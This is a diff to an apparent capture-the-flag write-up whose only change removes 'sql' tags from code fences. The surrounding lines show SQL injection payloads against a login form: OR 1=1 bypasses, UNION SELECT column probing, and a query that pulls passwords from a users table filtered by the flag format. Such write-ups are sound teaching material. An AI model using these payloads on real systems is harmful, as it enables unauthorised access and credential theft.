@@ -49,7 +49,7 @@ A simple `'` crashes the application, so this field is most likely injectable.
 Let's try to login as `user`. This particular username may not exist but
 it will give us some information on how the application behaves:
 
-```sql
+```
 user' OR 1=1 --
 ```
 
@@ -62,7 +62,7 @@ exists and works.*
 
 Let's try with a username that will most likely not exist:
 
-```sql
+```
 does_not_exist' OR 1=1 --
 ```
 
@@ -82,7 +82,7 @@ whocares' UNION SELECT 1, 2, 3 --
 
 All these payloads crashes the application.
 
-```sql
+```
 whocares' UNION SELECT 1, 2, 3, 4 --
 ```
 
@@ -93,7 +93,7 @@ This payload does not crash the application and logs us as `2`.
 Let's replace the numbers by actual column names. We guess that the `id`
 column exists and that the password column is named `password`.
 
-```sql
+```
 whocares' UNION SELECT id, password, id, id from users --
 ```
 
@@ -103,7 +103,7 @@ We are now logged as `monkey28`, which is the password of `TESTIING`.
 
 Let's add a constraint on the password column that matches the flag format:
 
-```sql
+```
 whocares' UNION SELECT id, password, id, id from users where password like "dctf%" --
 ```
 
